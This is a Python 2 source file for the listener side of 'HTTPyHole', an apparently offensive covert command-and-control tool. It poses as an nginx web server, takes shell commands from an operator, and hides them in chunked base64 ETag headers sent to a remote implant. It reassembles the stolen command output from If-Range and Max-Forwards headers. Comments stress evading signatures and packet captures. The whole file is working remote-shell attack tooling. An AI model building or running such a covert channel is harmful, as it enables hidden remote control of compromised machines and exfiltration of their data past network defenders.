#/usr/bin/env python

#
# listen.py -- HTTPyHole listener
# Author: pasv (pasvninja [at] gmail [d0t] com
# 

# This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import BaseHTTPServer
import base64

# These can be changed but must match your shell,
BLOCK_SIZE = 32
INIT_CONNECTION_STRING = "737060cd8c284d8af7ad3082f209582d" # change this or randomize it if you find yourself being sig'd
CONT_CONNECTION_STRING = "227061cd8c2a4d8af7ab2132f203453a"
FINI_CONNECTION_STRING = "143061cdac2a4d8ff7ad213432cd413a"

DEFAULT_PORT = 80
SERVER_VERSION="nginx/0.7.67"

class placeholder():
    def init(self):
        self.send_size=0
        self.send_count=0
        self.send_blocks = []
        self.response_blocks = []
        self.response_count = 0

w=placeholder()

class HTTPHandler (BaseHTTPServer.BaseHTTPRequestHandler):
    # later we will parse the end of each URL request GET /images/goat.[gif] for the file type and repond accordingly, no shell data included
    def do_GET(self):  #url completely ignored, insert random GETs of various resources for your shell, CSS, js, gif, jpg, html files doesnt matter
        self.server_version = SERVER_VERSION
        self.sys_version = ""
        self.send_response(200)
        if(self.headers.getheader("If-None-Match") == INIT_CONNECTION_STRING):
            # Our shell is waiting for a new command
            cmd = raw_input("$:")
            w.send_count = 0
            print "Sending command: " + cmd
            cmd = base64.b64encode(cmd)
            w.send_size = len(cmd) / BLOCK_SIZE
            if(len(cmd) % BLOCK_SIZE != 0):
                w.send_size = w.send_size + 1
            self.send_header("Retry-After", w.send_size+50 ) # this determines how many chunks we have to send to send the command..
            w.response_count = 0
            # split up the send blocks
            w.send_blocks = []
            w.response_blocks = []
            i=0
            j=0
            for c in list(cmd):
                w.send_blocks.append("")
                if((i % BLOCK_SIZE) == 0 and i != 0):
                    j += 1
                w.send_blocks[j] += c 
                i += 1
            self.end_headers()
            self.wfile.write(self.do_FAKE_RESPONSE()) 
        if(self.headers.getheader("If-None-Match") == CONT_CONNECTION_STRING):
            # set the w.send_count-1 and update Retry-After accordingly for shell
            if(w.send_size > w.send_count):
                #self.send_header("Retry-After", (w.send_size-w.send_count+50))
                self.send_header("ETag", w.send_blocks[w.send_count]) #change this, even randomize it if you can establish an ordering with your shell.. :)
                w.send_count += 1
            
        # consider using a different header, might be effected by proxies
        if(self.headers.getheader("Max-Forwards")):   # number of chunks remaining to be sent (Max-Forwards-10)
            print "Max-Forwards:" + self.headers.getheader("Max-Forwards")
            if(int(self.headers.getheader("Max-Forwards"))-10 != 0):
                w.response_blocks.append("")
                w.response_blocks[w.response_count] = str(self.headers.getheader("If-Range"))
                w.response_count += 1
            else: # when Max-Forwards is = 10 the transmission is over, piece together the blocks and show output
                    response = ""
                    for chunks in w.response_blocks:
                        response = response + chunks
                    response = base64.b64decode(response)
                    print response
                    w.response_count=0

        self.end_headers()
        self.wfile.write(self.do_FAKE_RESPONSE()) # take GET's filetype request, match it to a file and plug it in
    # add support later
    def do_POST(self):
        self.do_GET(self) # doesnt matter to us GET, PUT, POST, or w/e, even randomizing might be cool
    
    def do_FAKE_RESPONSE(self):
        return "" # insert nice junk here for their packet capture to gloss over


if __name__ == "__main__":
    svr = BaseHTTPServer.HTTPServer(('', DEFAULT_PORT), HTTPHandler) # wait for pwn
    try:
        svr.serve_forever()
    except KeyboardInterrupt:
        print "[!]Ctrl^c caught: exiting."